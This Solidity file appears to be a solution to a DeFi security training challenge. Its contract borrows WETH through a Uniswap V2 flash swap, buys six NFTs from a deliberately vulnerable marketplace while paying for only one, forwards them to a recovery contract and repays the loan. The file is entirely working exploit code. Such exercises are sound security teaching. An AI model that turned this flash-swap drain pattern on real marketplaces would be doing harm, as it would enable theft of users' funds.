// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import "../../../src/Contracts/free-rider/Interfaces.sol";
import "../../../src/Contracts/free-rider/FreeRiderRecovery.sol";
import "../../../lib/solmate/src/tokens/WETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract FlashSwap is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace internal immutable marketplace;
    FreeRiderRecovery internal immutable recovery;
    WETH internal immutable weth;
    address payable pairAddress;

    constructor(
        address payable _marketplace,
        address _recovery,
        address payable _pairAddress,
        address payable _weth
    ) payable {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = FreeRiderRecovery(_recovery);
        pairAddress = _pairAddress;
        weth = WETH(_weth);
    }

    function uniswapV2Call(
        address,
        uint,
        uint amount1,
        bytes calldata data
    ) external {
        weth.withdraw(amount1);
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i; i < 6; ++i) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value: amount1}(tokenIds);
        for (uint256 i; i < tokenIds.length; ++i) {
            marketplace.token().safeTransferFrom(
                address(this),
                address(recovery),
                i,
                data
            );
        }
        weth.deposit{value: address(this).balance}();
        weth.transfer(address(pairAddress), weth.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
